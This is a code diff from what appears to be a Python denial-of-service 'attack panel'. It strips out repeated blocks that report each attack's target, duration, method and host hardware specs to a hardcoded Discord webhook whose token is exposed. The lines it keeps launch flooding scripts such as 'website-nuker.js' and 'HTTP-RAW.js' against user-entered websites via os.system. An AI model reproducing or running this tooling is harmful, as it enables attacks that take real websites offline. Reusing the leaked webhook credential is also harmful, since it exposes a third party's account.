-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite}')
-                    
-                embed.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
-                embed.add_embed_field(name='Method:', value='nuker-proxyless')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(sendattackwebsitenuker)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite}')
-                    
-                embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
-                embedx.add_embed_field(name='Method:', value='nuker-proxyless')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
 
                 load()
                 license()
@@ -3353,86 +1050,13 @@ def menu():
                 timewebsitenuker1 = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                 sendattackwebsitenuker1 = ("node website-nuker.js " + websitenukerwebsite1 + " " + timewebsitenuker1)
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite1}')
-                    
-                embed.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
-                embed.add_embed_field(name='Method:', value='nuker-proxied')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
+                
 
 
 
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(sendattackwebsitenuker1)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite1}')
-                    
-                embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker1}')
-                embedx.add_embed_field(name='Method:', value='nuker-proxyless')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
-
+                
                 load()
                 license()
                 menu()
@@ -3448,85 +1072,9 @@ def menu():
                 rawtime = input('\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m')
                 sendrawhttp = ("node HTTP-RAW.js " + targetraw + " " + rawtime)
                 tip()
-                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embed.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Send to:', value=f'{targetraw}')
-                    
-                embed.add_embed_field(name='Time:', value=f'{rawtime}')
-                embed.add_embed_field(name='Method:', value='http-raw')
-                embed.add_embed_field(name='Machine:', value=f'{machine}')
-                embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhook.add_embed(embed)
-                response = webhook.execute()
+                
                 os.system(sendrawhttp)
-                webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                embedx.set_timestamp()
-
-
-                embed.add_embed_field(name='Attack Stopped for:', value=f'{targetraw}')
-                    
-                embed.add_embed_field(name='Time:', value=f'{rawtime}')
-                embedx.add_embed_field(name='Method:', value='http-raw')
-                embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                webhookx.add_embed(embedx)
-                responsex = webhookx.execute()
+                
 
                 load()
                 license()
